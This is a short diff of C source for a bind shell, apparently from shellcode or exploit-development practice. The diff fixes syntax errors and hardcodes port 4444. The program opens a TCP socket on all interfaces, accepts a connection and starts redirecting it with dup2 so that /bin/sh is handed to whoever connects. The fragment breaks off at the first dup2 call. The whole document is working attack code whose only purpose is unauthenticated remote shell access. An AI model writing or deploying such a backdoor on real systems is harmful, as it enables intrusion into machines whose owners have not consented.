@@ -18,15 +18,15 @@ main(int argc, char **argv)
 	int sockaddr_len = sizeof(struct sockaddr_in);
 	char *arguments[] = { "/bin/sh", 0 };
 	
-	(sock = socket(AF_INET, SOCK_STREAM, 0)
+	sock = socket(AF_INET, SOCK_STREAM, 0);
 		
 	server.sin_family = AF_INET;
-	server.sin_port = htons(atoi(argv[1]));
+	server.sin_port = htons(4444);
 	server.sin_addr.s_addr = INADDR_ANY;
 			
-	(bind(sock, (struct sockaddr *)&server, sockaddr_len)
-	(listen(sock, 2))
-	new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
+	bind(sock, (struct sockaddr *)&server, sockaddr_len);
+	listen(sock, 2);
+	new = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
 	close(sock);
 	
 	dup2(new, 0);
